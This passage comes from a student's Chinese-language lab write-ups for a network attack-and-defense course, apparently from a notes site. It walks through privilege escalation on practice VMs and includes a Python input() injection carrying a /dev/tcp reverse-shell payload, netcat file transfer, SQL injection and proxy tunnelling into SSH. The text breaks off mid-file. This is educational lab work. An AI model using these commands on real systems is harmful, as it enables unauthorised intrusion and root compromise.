<p>\u6211\u4eec\u770b\u770b <code>CREDS</code> \u76ee\u5f55\u4e2d\u7684\u5185\u5bb9\uff1a</p> <pre><code>www-data@box7:/opt/80$ cat /home/nitish/.dev/creds.txt\ncat /home/nitish/.dev/creds.txt\nnitish:p4ssw0rdStr3r0n9\n</code></pre> <p>\u5f97\u5230\u4e86 nitish \u7684\u5bc6\u7801\uff0c\u5c1d\u8bd5\u5207\u6362\uff0c\u4f46\u5b83\u544a\u8bc9\u6211\u4eec\uff1a</p> <pre><code>www-data@box7:/opt/80$ su nitish\nsu nitish\nsu: must be run from a terminal\n</code></pre> <p>\u6240\u4ee5\u6211\u4eec\u9700\u8981\u66f4\u597d\u7684 shell \u4f53\u9a8c\uff1a\u5373\u6267\u884c <code>python -c 'import pty;pty.spawn(\"/bin/bash\")'</code></p> <pre><code>\u2514\u2500$ nc -nvlp 3343\nlistening on [any] 3343 ...\nconnect to [10.0.2.4] from (UNKNOWN) [10.0.2.10] 44830\nbash: cannot set terminal process group (664): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@box7:/opt/80$ python -c 'import pty;pty.spawn(\"/bin/bash\")'\npython -c 'import pty;pty.spawn(\"/bin/bash\")'\nwww-data@box7:/opt/80$ su nitish\nsu nitish\nPassword: p4ssw0rdStr3r0n9\n\nnitish@box7:/opt/80$ \n</code></pre> <p>\u73b0\u5728\u6211\u4eec\u5c31\u6210\u529f\u5207\u6362\u5230 nitish \u7528\u6237\u4e86\uff0c\u63a5\u4e0b\u6765\u770b\u770b\u6743\u9650\uff1a</p> <pre><code>nitish@box7:/opt/80$ sudo -l\nsudo -l\nMatching Defaults entries for nitish on box7:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser nitish may run the following commands on box7:\n    (sam) NOPASSWD: /usr/bin/genie\n</code></pre> <p>\u53d1\u73b0\u53ef\u4ee5\u65e0\u6761\u4ef6\u4ee5 sam \u7528\u6237\u6267\u884c <code>/usr/bin/genie</code>\uff1a</p> <pre><code>nitish@box7:/opt/80$ sudo -u sam /usr/bin/genie\nsudo -u sam /usr/bin/genie\nusage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish\ngenie: error: the following arguments are required: wish\n</code></pre> <p>\u5f97\u5230\u4e86\u4e00\u4e9b\u53c2\u6570\u4fe1\u606f\uff0c<code>man</code> \u4e00\u4e0b\u770b\u770b\u6307\u4ee4\u624b\u518c\uff1a</p> <pre><code>nitish@box7:/opt/80$ man /usr/bin/genie | cat\nman /usr/bin/genie | cat\n\nman(8)                          genie man page                          man(8)\n\nNAME\n       genie - Make a wish\n\nSYNOPSIS\n       genie [-h] [-g] [-p SHELL] [-e EXEC] wish\n\nDESCRIPTION\n       genie would complete all your wishes, even the naughty ones.\n\n       We  all  dream  of getting those crazy privelege escalations, this will                                                                             \n       even help you acheive that.                                                                                                                         \n\nOPTIONS\n       wish\n\n              This is the wish you want to make .\n\n       -g, --god\n\n              Sometime we all would like to make a wish to  god,  this  option\n              let you make wish directly to God;\n\n              Though  genie can't gurantee you that your wish will be heard by\n              God, he's a busy man you know;\n\n       -p, --shell\n\n              Well who doesn't love those. You can get shell. Ex: -p \"/bin/sh\"\n\n       -e, --exec\n\n              Execute command on someone else computer is just too  damn  fun,\n              but this comes with some restrictions.\n\n       -cmd\n\n              You know sometime all you new is a damn CMD, windows I love you.\n\nSEE ALSO\n       mzfr.github.io\n\nBUGS\n       There  are  shit  loads  of bug in this program, it's all about finding\n       one.\n\nAUTHOR\n       mzfr\n\n1.0                            11 November 2019                         man(8)\n</code></pre> <p>\u5199\u5f97\u6709\u70b9\u62bd\u8c61\uff0c\u4e0d\u8fc7\u6211\u4eec\u5f97\u5230\u4e86 <code>-cmd</code> \u8fd9\u4e2a\u91cd\u8981\u53c2\u6570</p> <pre><code>nitish@box7:/opt/80$ sudo -u sam /usr/bin/genie -cmd\nsudo -u sam /usr/bin/genie -cmd\nusage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish\ngenie: error: the following arguments are required: wish\nnitish@box7:/opt/80$ sudo -u sam /usr/bin/genie -cmd wish\nsudo -u sam /usr/bin/genie -cmd wish\nPass your wish to GOD, he might be able to help you.\nnitish@box7:/opt/80$ sudo -u sam /usr/bin/genie -cmd whoami\nsudo -u sam /usr/bin/genie -cmd whoami\nmy man!!\n$ whoami\nwhoami\nsam\n</code></pre> <p>\u4e8e\u662f\u6210\u529f\u83b7\u5f97\u4e86 sam \u7528\u6237\u8eab\u4efd\u53ca\u5176\u6743\u9650\u3002\u7ee7\u7eed\u67e5\u770b\u5176\u6743\u9650\uff1a</p> <pre><code>$ sudo -l\nsudo -l\nMatching Defaults entries for sam on box7:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser sam may run the following commands on box7:\n    (root) NOPASSWD: /root/lago\n</code></pre> <p>\u53d1\u73b0\u5176\u53ef\u4ee5\u65e0\u6761\u4ef6\u4ee5 root \u7528\u6237\u6267\u884c <code>/root/lago</code>\uff0c\u6267\u884c\u4e4b\uff1a</p> <pre><code>$ sudo /root/lago\nsudo /root/lago\nWhat do you want to do ?\n1 - Be naughty\n2 - Guess the number\n3 - Read some damn files\n4 - Work\nEnter your choice:\n</code></pre> <p>\u56db\u4e2a\u9009\u9879\u90fd\u53ef\u4ee5\u5c1d\u8bd5\u4e00\u4e0b\uff0c\u7ed3\u679c\u662f\u90fd\u5728\u9017\u4f60\u73a9\u3002</p> <p>\u6211\u4eec\u7ee7\u7eed\u63a2\u7d22 sam \u7528\u6237\u76f8\u5173\u7684\u4e1c\u897f\uff1a</p> <pre><code>$ cd ~\ncd ~\n$ cd /home/sam\ncd /home/sam\n$ ls -la\nls -la\ntotal 36\ndrwxr-x--- 4 sam  sam  4096 Nov 14  2019 .\ndrwxr-xr-x 4 root root 4096 Nov 14  2019 ..\n-rw------- 1 root root  417 Nov 14  2019 .bash_history\n-rw-r--r-- 1 root root  220 Oct 20  2019 .bash_logout\n-rw-r--r-- 1 sam  sam  3771 Oct 20  2019 .bashrc\ndrwx------ 2 sam  sam  4096 Nov 11  2019 .cache\ndrwx------ 3 sam  sam  4096 Oct 20  2019 .gnupg\n-rw-r--r-- 1 sam  sam   807 Oct 20  2019 .profile\n-rw-r--r-- 1 sam  sam  1749 Nov  7  2019 .pyc\n-rw-r--r-- 1 sam  sam     0 Nov  7  2019 .sudo_as_admin_successful\n</code></pre> <p>\u53d1\u73b0\u7528\u6237\u76ee\u5f55\u4e0b\u6709\u4e00\u4e2a <code>.pyc</code> \u6587\u4ef6\uff0c\u542f\u52a8\u4e00\u4e2a\u65b0\u7ec8\u7aef\u76d1\u542c\uff1a</p> <pre><code>\u2514\u2500$ nc -nvlp 4444 &gt; 1.pyc\nlistening on [any] 4444 ...\nconnect to [10.0.2.4] from (UNKNOWN) [10.0.2.10] 58560\n</code></pre> <p>\u5728\u65e7\u7ec8\u7aef\u4e2d\u4f20\u8f93\uff1a</p> <pre><code>$ nc -w 4 10.0.2.4 4444 &lt;.pyc\nnc -w 4 10.0.2.4 4444 &lt;.pyc\n</code></pre> <p>\u7136\u540e\u6211\u4eec\u5728\u65b0\u7ec8\u7aef\u4e2d\u53cd\u7f16\u8bd1\u8fd9\u4e2a <code>.pyc</code> \u6587\u4ef6</p> <pre><code>\u2514\u2500$ ./pycdc /home/kali/Downloads/1.pyc                                                                                                                     \n# Source Generated with Decompyle++\n# File: 1.pyc (Python 2.7)\n\nfrom getpass import getuser\nfrom os import system\nfrom random import randint\n\ndef naughtyboi():\n    print 'Working on it!! '\n\n\ndef guessit():\n    num = randint(1, 101)\n    print 'Choose a number between 1 to 100: '\n    s = input('Enter your number: ')\n    if s == num:\n        system('/bin/sh')\n    else:\n        print 'Better Luck next time'\n\n\ndef readfiles():\n    user = getuser()\n    path = input('Enter the full of the file to read: ')\n    print 'User %s is not allowed to read %s' % (user, path)\n\n\ndef options():\n    print 'What do you want to do ?'\n    print '1 - Be naughty'\n    print '2 - Guess the number'\n    print '3 - Read some damn files'\n    print '4 - Work'\n    choice = int(input('Enter your choice: '))\n    return choice\n\n\ndef main(op):\n    if op == 1:\n        naughtyboi()\n    elif op == 2:\n        guessit()\n    elif op == 3:\n        readfiles()\n    elif op == 4:\n        print 'work your ass off!!'\n    else:\n        print 'Do something better with your life'\n\nif __name__ == '__main__':\n    main(options())\n</code></pre> <p>\u6211\u4eec\u53d1\u73b0\u9009\u9879 2 \u5bf9\u5e94\u7684 <code>guessit()</code> \u51fd\u6570\u4e2d\u4f7f\u7528\u4e86 <code>input()</code> \u51fd\u6570\uff0c\u5176\u5b58\u5728\u6ce8\u5165\u6f0f\u6d1e\uff1a</p> <pre><code>def guessit():\n    num = randint(1, 101)\n    print 'Choose a number between 1 to 100: '\n    s = input('Enter your number: ')\n    if s == num:\n        system('/bin/sh')\n    else:\n        print 'Better Luck next time'\n</code></pre> <p>\u6211\u4eec\u53ea\u9700\u8f93\u5165 <code>num</code>\uff0c\u8fd9\u6761\u8d4b\u503c\u8bed\u53e5\u5c31\u4f1a\u53d8\u4e3a <code>s=num</code>\uff0c\u90a3\u4e48\u63a5\u4e0b\u6765 <code>s == num</code> \u81ea\u7136\u6210\u7acb\uff1a</p> <pre><code>$ sudo /root/lago\nsudo /root/lago\nWhat do you want to do ?\n1 - Be naughty\n2 - Guess the number\n3 - Read some damn files\n4 - Work\nEnter your choice:2\n2\nChoose a number between 1 to 100: \nEnter your number: num\nnum\n# whoami\nwhoami\nroot\n# \n</code></pre> <p>\u6210\u529f\u83b7\u53d6 root \u6743\u9650\uff0c\u63a5\u4e0b\u6765\u6539\u5bc6\u7801\uff1a</p> <p></p>"},{"location":"in_class_learning/semester_3/network_attack_and_defense/lab8/#_1","title":"\u9644\u52a0\u9898","text":"<p>\u6211\u4eec\u73b0\u5728\u5df2\u83b7\u5f97\u4e86 root \u6743\u9650\uff0c\u63a5\u4e0b\u6765\u7ee7\u7eed\u63a2\u7d22\u3002</p>"},{"location":"in_class_learning/semester_3/network_attack_and_defense/lab8/#1337-telnet","title":"\u4e00\u30011337 \u7aef\u53e3\u7528 telnet \u8bbf\u95ee\u670d\u52a1\u5b58\u5728\u6f0f\u6d1e\uff0c\u8bd5\u5bfb\u627e\u4e4b","text":"<pre><code>\u2514\u2500$ telnet 10.0.2.10 1337\nTrying 10.0.2.10...\nConnected to 10.0.2.10.\nEscape character is '^]'.\n  ____                        _____ _                \n / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ \n| |  _ / _` | '_ ` _ \\ / _ \\   | | | | '_ ` _ \\ / _ \\\n| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/\n \\____|\\__,_|_| |_| |_|\\___|   |_| |_|_| |_| |_|\\___|\n\n\nLet's see how good you are with simple maths\nAnswer my questions 1000 times and I'll give you your gift.\n(4, '-', 6)\n&gt; \n</code></pre> <p>\u6211\u4eec\u5229\u7528 root \u6743\u9650\u67e5\u8be2\u7ba1\u7406\u5176\u670d\u52a1\uff1a</p> <pre><code># netstat -anp | grep 1337\nnetstat -anp | grep 1337\ntcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      750/xinetd \n</code></pre> <p>\u53d1\u73b0\u5176\u4f7f\u7528 xinetd \u8fd9\u4e00\u670d\u52a1\uff0c\u7ee7\u7eed\u67e5\u8be2\u4e4b\uff1a</p> <pre><code># cd /etc/xinetd.d\ncd /etc/xinetd.d\n# ls\nls\nchargen      daytime      discard      echo      game     services  time-udp\nchargen-udp  daytime-udp  discard-udp  echo-udp  servers  time\n# cat game\ncat game\nservice game\n\n{\n\n  disable = no\n\n  socket_type = stream\n\n  protocol = tcp\n\n  wait = no\n\n  user = root\n\n  type = UNLISTED\n\n  bind = 0.0.0.0\n\n  port = 1337\n\n  server = /opt/1337/run_challenge.sh\n\n}\n</code></pre> <p>\u4ece\u5217\u8868\u4e2d\u5f97\u5230 <code>server</code> \u7684\u76ee\u5f55\uff0c\u67e5\u770b\u4e4b\uff1a</p> <pre><code>cat /opt/1337/run_challenge.sh\n#! /bin/bash\n\npython -u /opt/1337/app.py\n\n\n# \n</code></pre> <p>\u5f97\u5230\u4e00\u4e2a <code>python</code> \u6587\u4ef6\u7684\u76ee\u5f55\uff0c\u67e5\u770b\u4e4b\uff1a</p> <pre><code># cat python -u /opt/1337/app.py\ncat python -u /opt/1337/app.py\ncat: python: No such file or directory\n#!/usr/bin/env python3\n\nimport sys\n\nfrom random import choice, randint\n\n\n\nfrom pyfiglet import print_figlet\n\n\n\n\n\ndef add(a,b): return a+b\n\ndef div(a,b): return int(a/b)\n\ndef multiply(a,b): return a*b\n\ndef sub(a,b): return a-b\n\n\n\nprint_figlet(\"Game Time\")\n\nprint(\"Let's see how good you are with simple maths\")\n\nprint(\"Answer my questions 1000 times and I'll give you your gift.\")\n\n\n\n\n\nOPERATIONS = ['+', '-', \"/\", \"*\"]\n\n\n\ndef main():\n\n    for i in range(1001):\n\n        a = randint(1,9)\n\n        b = randint(1,9)\n\n        op = choice(OPERATIONS)\n\n\n\n        print(a,op,b)\n\n        if op == \"+\":\n\n            val = add(a,b)\n\n        if op == \"-\":\n\n            val = sub(a,b)\n\n        if op == \"/\":\n\n            val = div(a,b)\n\n        if op == \"*\":\n\n            val = multiply(a,b)\n\n\n\n        try:\n\n            In = int(input(\"&gt; \"))\n\n        except Exception:\n\n            print(\"Stop acting like a hacker for a damn minute!!\")\n\n            sys.exit(1)\n\n\n\n        if In == val:\n\n            continue\n\n        else:\n\n            print(\"Wrong answer\")\n\n            sys.exit(1)\n\n\n\n    with open(\"/opt/1337/p0rt5\", 'r') as f:\n\n        print(f.read())\n\n\n\nif __name__ == \"__main__\":\n\n    main()\n\n\n# \n</code></pre> <p>\u8fd9\u91cc\u4ecd\u7136\u5b58\u5728 <code>input()</code> \u7684\u6ce8\u5165\u6f0f\u6d1e\uff0c\u4e0d\u8fc7\u65e2\u7136\u6211\u4eec\u77e5\u9053\u6e90\u4ee3\u7801\u4e86\uff0c\u53ef\u4ee5\u76f4\u63a5\u67e5\u770b\u4ee3\u7801\u4e2d\u4f5c\u4e3a\u7ed3\u679c\u6253\u5f00\u7684\u6587\u4ef6\uff1a</p> <pre><code># cat /opt/1337/p0rt5\ncat /opt/1337/p0rt5\nHere is your gift, I hope you know what to do with it:\n\n1356, 6784, 3409\n</code></pre> <p>\u5f97\u5230\u4e86\u4e09\u4e2a\u6570\u5b57\u3002</p> <p>\u8fd9\u4e09\u4e2a\u6570\u5b57\u6709\u5f88\u591a\u65b9\u6cd5\u5f97\u5230\uff1a</p> <ol> <li>\u6b63\u89c4\u65b9\u6cd5\uff0c\u771f\u7684\u56de\u7b54\u4e00\u5343\u6b21\uff0c\u6216\u4f7f\u7528\u811a\u672c\u56de\u7b54\uff0c\u5f97\u5230\u3002</li> <li>\u6ce8\u5165\u4e4b\uff0c\u8f93\u5165\u4e00\u5343\u6b21\u6216\u4f7f\u7528\u811a\u672c\u8f93\u5165\u4e00\u5343\u6b21 <code>val</code> \u5f97\u5230\u3002</li> <li>\u67e5\u770b\u6e90\u4ee3\u7801\u76f4\u63a5\u6253\u5f00\u76ee\u5f55\u5f97\u5230\u3002</li> </ol>"},{"location":"in_class_learning/semester_3/network_attack_and_defense/lab8/#_2","title":"\u4e8c\u3001\u4e09\u4e2a\u6570\u5b57\u7684\u7528\u5904","text":"<p>\u8fd9\u4e09\u4e2a\u6570\u5b57\u5176\u5b9e\u662f\u7528\u4e8e\u6253\u5f00 filtered \u7684 22 \u53f7\u7aef\u53e3\uff1a</p> <pre><code>\u2514\u2500$ sudo nmap -p- 10.0.2.10\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-11-30 02:32 EST\nNmap scan report for 10.0.2.10\nHost is up (0.00015s latency).\nNot shown: 65531 closed tcp ports (reset)\nPORT     STATE    SERVICE\n21/tcp   open     ftp\n22/tcp   filtered ssh\n1337/tcp open     waste\n7331/tcp open     swx\nMAC Address: 08:00:27:12:0C:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 2.25 second\n</code></pre> <p>\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\uff0c\u5bf9\u7aef\u53e3\u8fdb\u884c\u6572\u95e8\uff1a</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ knock 10.0.2.10 1356 6784 3409\n\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p- 10.0.2.10                                                                                                                  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-11-30 02:34 EST\nNmap scan report for 10.0.2.10\nHost is up (0.00044s latency).\nNot shown: 65531 closed tcp ports (reset)\nPORT     STATE SERVICE\n21/tcp   open  ftp\n22/tcp   open  ssh\n1337/tcp open  waste\n7331/tcp open  swx\nMAC Address: 08:00:27:12:0C:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 2.60 seconds\n</code></pre> <p>\u4e5f\u5c31\u662f\u6253\u5f00\u4e86 22 \u53f7\u7aef\u53e3\uff0c\u4ece\u800c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 ssh \u670d\u52a1\u4e86\u3002</p> <p>\u8fd9\u70b9\u6700\u76f4\u63a5\u7684\u7528\u5904\u662f\u53ef\u4ee5\u76f4\u63a5\u8fdc\u7a0b\u767b\u9646 nitish \u7528\u6237\uff0c\u800c\u4e0d\u5fc5\u518d\u4f7f\u7528\u53cd\u5f39 shell\uff1a</p> <pre><code>\u2514\u2500$ ssh nitish@10.0.2.10\nThe authenticity of host '10.0.2.10 (10.0.2.10)' can't be established.\nED25519 key fingerprint is SHA256:hDngTQnjVXoBeWuPEH3si0MbCre9a/g2G4N6/pRZLFk.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.0.2.10' (ED25519) to the list of known hosts.\nnitish@10.0.2.10's password: \nWelcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-66-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Sun Nov 30 13:05:28 IST 2025\n\n  System load:  0.0               Processes:           118\n  Usage of /:   37.6% of 9.78GB   Users logged in:     1\n  Memory usage: 21%               IP address for eth0: 10.0.2.10\n  Swap usage:   0%\n\n\n * Canonical Livepatch is available for installation.\n   - Reduce system reboots and improve kernel security. Activate at:\n     https://ubuntu.com/livepatch\n\n329 packages can be updated.\n266 updates are security updates.\n\nNew release '20.04.6 LTS' available.\nRun 'do-release-upgrade' to upgrade to it.\n\n\nLast login: Thu Nov 14 20:32:20 2019 from 192.168.1.107\nnitish@box7:~$ \n</code></pre>"},{"location":"in_class_learning/semester_3/network_attack_and_defense/lab8/#_3","title":"\u4e09\u3001\u5bf9\u7b2c\u4e00\u4e2a\u95ee\u9898\u7684\u53e6\u4e00\u4e2a\u56de\u7b54","text":"<p>\u6211\u4eec\u4e4b\u524d\u63d0\u5230\u7b2c\u4e00\u4e2a\u95ee\u9898\u7684\u6f0f\u6d1e\u5728\u4e8e\u6ce8\u5165\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u76f4\u63a5\u8f93\u5165\u4e00\u5343\u904d <code>val</code> \u5f97\u5230\u795e\u79d8\u7684\u4e09\u4e2a\u6570\u5b57\uff0c\u4f46\u662f\u8fd9\u4e2a\u6ce8\u5165\u6f0f\u6d1e\u8fd8\u53ef\u4ee5\u8d77\u5230\u522b\u7684\u4f5c\u7528\u3002</p> <p>\u6ce8\u610f game \u670d\u52a1\u7684\u6267\u884c\u8005\u662f root\uff0c\u6211\u4eec\u4e8e\u662f\u5c31\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u6ce8\u5165\u6f0f\u6d1e + \u53cd\u5f39 shell \u7a83\u53d6\u5176\u6743\u9650\uff1a</p> <pre><code>\u2514\u2500$ telnet 10.0.2.10 1337                                                                                                                                  \nTrying 10.0.2.10...\nConnected to 10.0.2.10.\nEscape character is '^]'.\n  ____                        _____ _                \n / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ \n| |  _ / _` | '_ ` _ \\ / _ \\   | | | | '_ ` _ \\ / _ \\\n| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/\n \\____|\\__,_|_| |_| |_|\\___|   |_| |_|_| |_| |_|\\___|\n\n\nLet's see how good you are with simple maths\nAnswer my questions 1000 times and I'll give you your gift.\n(1, '*', 2)\n&gt; __import__('os').system('bash -c \"bash -i &gt;&amp; /dev/tcp/10.0.2.4/3343 0&gt;&amp;1\"')\n</code></pre> <p>\u7a83\u53d6 root \u6743\u9650\u6210\u529f\uff01</p>"},{"location":"in_class_learning/semester_3/network_attack_and_defense/lab9/","title":"Lab9","text":"<p>Network Atk&amp;Def lab9 241840273 \u6768\u826f\u707c</p> <p>\u67e5\u8be2\u653b\u51fb\u673a ip</p> <pre><code>\u2514\u2500$ ifconfig\neth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500\n        inet 10.0.2.4  netmask 255.255.255.0  broadcast 10.0.2.255\n        inet6 fe80::9d17:dec1:4341:a804  prefixlen 64  scopeid 0x20&lt;link&gt;\n        ether 08:00:27:3c:97:80  txqueuelen 1000  (Ethernet)\n        RX packets 1  bytes 590 (590.0 B)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 24  bytes 3152 (3.0 KiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 8  bytes 480 (480.0 B)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 8  bytes 480 (480.0 B)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n</code></pre> <p>\u4e3b\u673a\u53d1\u73b0</p> <pre><code>\u2514\u2500$ sudo arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 08:00:27:3c:97:80, IPv4: 10.0.2.4\nWARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied\nWARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n10.0.2.1        52:54:00:12:35:00       (Unknown: locally administered)\n10.0.2.2        52:54:00:12:35:00       (Unknown: locally administered)\n10.0.2.3        08:00:27:cc:7d:ae       (Unknown)\n10.0.2.17       08:00:27:83:79:65       (Unknown)\n\n4 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.933 seconds (132.44 hosts/sec). 4 responded\n</code></pre> <p>\u7aef\u53e3\u626b\u63cf</p> <pre><code>\u2514\u2500$ sudo nmap -p- -sV -sC 10.0.2.17\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 07:50 EST\nNmap scan report for bogon (10.0.2.17)\nHost is up (0.00047s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT     STATE    SERVICE    VERSION\n22/tcp   filtered ssh\n80/tcp   open     http       Apache httpd 2.2.22 ((Debian))\n|_http-server-header: Apache/2.2.22 (Debian)\n|_http-title: Site doesn't have a title (text/html).\n3128/tcp open     http-proxy Squid http proxy 3.1.20\n|_http-server-header: squid/3.1.20\n|_http-title: ERROR: The requested URL could not be retrieved\nMAC Address: 08:00:27:83:79:65 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 35.42 seconds\n</code></pre> <p>\u6211\u4eec\u5206\u6790\u4e00\u4e0b\uff1a\u7b2c\u4e00\u4e2a\u662f 22 \u53f7\u7aef\u53e3\uff0c\u662f\u4e00\u4e2a\u76ee\u524d\u662f filtered \u7684 SSH \u670d\u52a1\uff1b\u7b2c\u4e8c\u4e2a\u662f 80 \u7aef\u53e3\u7684\u57fa\u4e8e Apache 2.22 \u7684 HTTP \u670d\u52a1\uff1b\u7b2c\u4e09\u4e2a\u662f 3128 \u7aef\u53e3\u7684 Squid \u4ee3\u7406\u670d\u52a1\u3002\u53e6\u5916\u9776\u673a\u64cd\u4f5c\u7cfb\u7edf\u4e3a Debian.</p> <p>\u5c1d\u8bd5\u8bbf\u95ee\u5404\u7aef\u53e3\uff0c\u53d1\u73b0 80 \u7aef\u53e3\u7684 HTTP \u670d\u52a1\u662f\u53ef\u4ee5\u8bbf\u95ee\u7684\u3002</p> <p></p> <p>\u5c1d\u8bd5 SQL \u6ce8\u5165\uff0c\u8fd9\u91cc\u8bfe\u4e0a\u662f\u4f7f\u7528 Burp Suite \u52a0\u4e00\u4e2a SQL \u6ce8\u5165\u8868\u5c1d\u8bd5\u2014\u2014\u8fd9\u662f\u56e0\u4e3a\u591a\u5c1d\u8bd5\u51e0\u6b21\u53d1\u73b0\u6709 SQL \u6ce8\u5165\u8fc7\u6ee4\uff0c\u7981\u7528\u4e86\u67d0\u4e9b\u5b57\u7b26\u3002</p> <p>\u4f7f\u7528 <code>'-</code> \u6ce8\u5165\uff0c\u6210\u529f\u3002</p> <p></p> <p>\u9875\u9762\u62e6\u4f4f\u6211\u4eec\u4e0d\u8ba9\u8fdb\u53bb\uff0c\u4f46\u662f\u63d0\u4f9b\u4e86\u8d26\u5bc6\uff0c\u5e76\u5f15\u5bfc\u6211\u4eec\u767b\u9646 SSH\uff1a</p> <pre><code>Username: john\nPassword: hereisjohn\n</code></pre> <p>\u5c1d\u8bd5\u76f4\u63a5 SSH \u8bbf\u95ee\uff1a</p> <pre><code>\u2514\u2500$ ssh john@10.0.2.17 -p 22                                                             ^C\n</code></pre> <p>\u7b49\u5f85\u8bb8\u4e45\u90fd\u8fde\u4e0d\u4e0a\uff0c\u5e94\u8be5\u662f\u88ab\u62e6\u4f4f\u4e86\uff0c\u5f53\u7136\u8fd9\u4e5f\u5bf9\u5e94\u4e0a\u9762 SSH \u670d\u52a1\u7aef\u53e3\u7684 filtered \u72b6\u6001\u3002</p> <p>\u8003\u8651\u501f\u52a9 3128 \u7aef\u53e3\u7684\u4ee3\u7406\u670d\u52a1\u8bbf\u95ee SSH \u670d\u52a1\uff08\u5185\u7f51\u8bbf\u95ee\uff09\u3002</p> <p>\u9996\u5148\u5efa\u7acb\u4e00\u4e2a\u96a7\u9053\uff1a</p> <pre><code>\u2514\u2500$ proxytunnel -p 10.0.2.17:3128 -d 10.0.2.17:22 -a 3343\n</code></pre> <p>\u7136\u540e\u8fde\u63a5\u672c\u5730\u7684\u4ee3\u7406\u7aef\u53e3\uff1a</p> <pre><code>\u2514\u2500$ ssh -p 3343 john@127.0.0.1\nThe authenticity of host '[127.0.0.1]:3343 ([127.0.0.1]:3343)' can't be established.\nECDSA key fingerprint is SHA256:QYZqyNNW/Z81N86urjCUIrTBvJ06U9XDDzNv91DYaGc.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '[127.0.0.1]:3343' (ECDSA) to the list of known hosts.\njohn@127.0.0.1's password: \nLinux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Fri Jun 20 07:41:08 2014\n\nFunds have been withdrawn\nConnection to 127.0.0.1 closed.\n</code></pre> <p></p> <p>SSH \u6210\u529f\u767b\u9646\u4e0a\u4e86\uff0c\u4f46\u662f\u8fd4\u56de <code>Funds have been withdrawn</code> \u540e\u5c31\u76f4\u63a5\u65ad\u5f00\u4e86\u8fde\u63a5\u3002</p> <p>\u8fd9\u8868\u660e\u5bf9\u9762\u6709\u4e00\u5b9a\u9632\u8303\u63aa\u65bd\uff0c\u6211\u4eec\u67e5\u770b\u4e00\u4e9b\u4fe1\u606f\uff1a</p> <pre><code>\u2514\u2500$ ssh -p 3343 john@127.0.0.1 \"cat ~/.bashrc\"\njohn@127.0.0.1's password: \n# ~/.bashrc: executed by bash(1) for non-login shells.\n# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)\n# for examples\n\n# If not running interactively, don't do anything\ncase $- in\n    *i*) ;;\n      *) return;;\nesac\n\n# don't put duplicate lines or lines starting with space in the history.\n# See bash(1) for more options\nHISTCONTROL=ignoreboth\n\n# append to the history file, don't overwrite it\nshopt -s histappend\n\n# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)                                                                                      \nHISTSIZE=1000                                                                                                                                              \nHISTFILESIZE=2000\n\n# check the window size after each command and, if necessary,\n# update the values of LINES and COLUMNS.\nshopt -s checkwinsize\n\n# If set, the pattern \"**\" used in a pathname expansion context will\n# match all files and zero or more directories and subdirectories.\n#shopt -s globstar\n\n# make less more friendly for non-text input files, see lesspipe(1)\n#[ -x /usr/bin/lesspipe ] &amp;&amp; eval \"$(SHELL=/bin/sh lesspipe)\"\n\n# set variable identifying the chroot you work in (used in the prompt below)\nif [ -z \"${debian_chroot:-}\" ] &amp;&amp; [ -r /etc/debian_chroot ]; then\n    debian_chroot=$(cat 